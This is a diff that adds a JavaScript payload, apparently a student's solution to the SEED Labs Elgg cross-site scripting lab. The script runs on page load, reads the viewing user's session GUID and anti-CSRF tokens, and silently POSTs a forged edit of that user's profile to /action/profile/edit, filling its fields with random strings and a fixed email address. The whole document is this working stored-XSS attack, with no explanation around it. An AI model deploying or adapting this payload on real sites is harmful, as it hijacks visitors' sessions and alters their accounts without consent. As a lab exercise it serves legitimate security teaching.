@@ -1,0 +1,55 @@
+<script type="text/javascript">
+  window.onload = function () {
+    //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+    //and Security Token __elgg_token
+    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+    //Construct the content of your url.
+    var sendurl = "/action/profile/edit"; //FILL IN
+    var params = {
+      __elgg_ts: elgg.security.token.__elgg_ts,
+      __elgg_token: elgg.security.token.__elgg_token,
+      name: Math.random().toString(36).substring(7),
+      description: "190572",
+      "accesslevel[description]": 1,
+      briefdescription: Math.random().toString(36).substring(7),
+      "accesslevel[briefdescription]": 1,
+      location: Math.random().toString(36).substring(7),
+      "accesslevel[location]": 1,
+      interests: Math.random().toString(36).substring(7),
+      "accesslevel[interests]": 1,
+      skills: Math.random().toString(36).substring(7),
+      "accesslevel[skills]": 1,
+      contactemail: "1905072@ugrad.cse.buet.ac.bd",
+      "accesslevel[contactemail]": 1,
+      phone: Math.random().toString(36).substring(7),
+      "accesslevel[phone]": 1,
+      mobile: Math.random().toString(36).substring(7),
+      "accesslevel[mobile]": 1,
+      website: Math.random().toString(36).substring(7),
+      "accesslevel[website]": 1,
+      twitter: Math.random().toString(36).substring(7),
+      "accesslevel[twitter]": 1,
+      guid: elgg.session.user.guid,
+    };
+
+    var content = Object.keys(params)
+      .map(function (key) {
+        return encodeURIComponent(key) + "=" + encodeURIComponent(params[key]);
+      })
+      .join("&");
+
+    if (elgg.page_owner.guid != elgg.session.user.guid) {
+      //Create and send Ajax request to modify profile
+      var Ajax = null;
+      Ajax = new XMLHttpRequest();
+      Ajax.open("POST", sendurl, true);
+      // Ajax.setRequestHeader("Host","www.seed-server.com");
+      Ajax.setRequestHeader(
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      );
+      Ajax.send(content);
+    }
+  };
+</script>
